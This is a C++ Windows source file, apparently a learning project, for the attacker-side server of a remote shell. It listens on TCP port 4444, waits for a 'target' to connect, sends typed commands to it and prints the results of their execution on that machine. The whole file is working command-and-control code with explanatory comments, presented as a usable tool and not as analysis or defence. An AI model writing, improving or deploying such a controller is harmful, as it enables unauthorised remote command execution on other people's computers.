#include <iostream>
#include <winsock2.h> // to initialize windows socket 
#include <ws2tcpip.h>    // lib for getting address info
#include <string>

                       
#pragma comment(lib, "ws2_32.lib");

#define DEFAULT_PORT "4444"


// To run the program use: g++ server.cpp -o server.exe -lws2_32

using namespace std;


void initializeWinSock() {
    // Structure that holds sockets about windows implementation, also stores winsocket version
    WSADATA wsaData;

    // initializes winsocket, takes version 2 of socket to be used, with reference to wsaData structure which will be filled with info about winsock implementation
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData); 

    // check if startup was unsuccessful 
    if(result != 0) {
        cerr << "WSAStartup failed." << result << endl;
        // exit 1 indicates error 
        exit(1);  

    }
        
}

// socket function 
SOCKET createSocket() {
    // address info pointing to result will be linked, as a list of addrinfo structures 
    struct addrinfo *result = NULL;
    struct addrinfo hints;

    // clears all the hints structure, ensures no hints were initialized before socket 
    ZeroMemory(&hints, sizeof(hints));

    // structure of socket 
    hints.ai_family = AF_INET;  // socket will be based on IPv4      
    hints.ai_socktype = SOCK_STREAM;    // sock stream for communication 
    hints.ai_protocol = IPPROTO_TCP;    // TCP protocol for transmission
    hints.ai_flags = AI_PASSIVE;        // ensures we are a listener 

    // Takes the local machine/ip address (127.0.0.1) through NULL, with the target connected to the default port, taking in the structure of the socket through hints, with the &result holding the addr information
    int iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);

    if(iResult != 0) {
        cerr << "get AddressInfo failed: " << iResult << endl;
        exit(1);
    }

    // storing socket info in result variable. Using -> since *result is a pointer, if result was not a pointer then it would look like (result.ai_family) 
    SOCKET serverSocket = socket(result -> ai_family, result -> ai_socktype, result -> ai_protocol);
    if(serverSocket == INVALID_SOCKET) {
        cerr << "Socket Creation failed." << endl;
        exit(1); 
    }

    iResult = bind(serverSocket, result -> ai_addr, (int)result -> ai_addrlen);
    if(iResult == SOCKET_ERROR) {
        cerr << "Bind failed." << endl;
        exit(1); 
    }

    return serverSocket;

}

// function for listening to incoming connections
void listenConnection(SOCKET serverSocket) {
    int iResult = listen(serverSocket, SOMAXCONN); // listens for connections from the target
    if(iResult == SOCKET_ERROR) {
        cerr << "Listen failed." << endl;
        exit(1);
    }
    cout << "Waiting for connection..." << endl;
} 

// function for accepting connection
SOCKET acceptConnection(SOCKET serverSocket) {
    // creating client socket
    SOCKET clientSocket = accept(serverSocket, NULL, NULL); // NULL is IP address and port of client, but we dont need it since we just need to accept client side socket
    if(clientSocket == INVALID_SOCKET) {
        cerr << "Accepting connection failed." << endl;
        exit(1);
    }
    cout << "Client connected." << endl;

    return clientSocket;
}

// function for sending message to client
// void sendMessage(SOCKET clientSocket, const string &message) {
//     // using c_str() which converts std string into C style string, allows support for more clients through older string conversion
//     int iResult = send(clientSocket, message.c_str(), message.length(), 0);

//     if(iResult == SOCKET_ERROR) {
//         cerr << "Send failed." << endl;
//         exit (1);
//     }
//     cout << "Message sent to client." << endl;
    

// }

// for sending commands to target
void sendCommand(SOCKET clientSocket, const string &command) {
    // using client socket for communication, with the command in c style string for older format
    int iResult = send(clientSocket, command.c_str(), command.length(), 0);
    if(iResult == SOCKET_ERROR) {
        cerr << "Send failed." << endl;
        exit(1);
    }

}

// receive result of command execution on client side
string receiveResult(SOCKET clientSocket) {
    // prevents buffer overflow of client
    char buffer[10000];
    int iResult = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if(iResult > 0) {
        buffer[iResult] = '\0'; //null terminator to determine end of string
    }else if(iResult == 0) {
        return "Connection closed.";
    }
    else {
        cerr << "Recv failed." << endl;
        exit(1);
    }
    return buffer;
    
}

int main() {
    initializeWinSock();

    SOCKET serverSocket = createSocket();
    listenConnection(serverSocket);
    SOCKET clientSocket = acceptConnection(serverSocket);

    while(true) {

        string command;
        cout << "~#: ";
        getline(cin, command);

        // breaks loop if typed exit
        if(command == "exit") break;
    
        sendCommand(clientSocket, command);
        string result = receiveResult(clientSocket);
        cout << result << endl;

    }
   
    return 0;
}

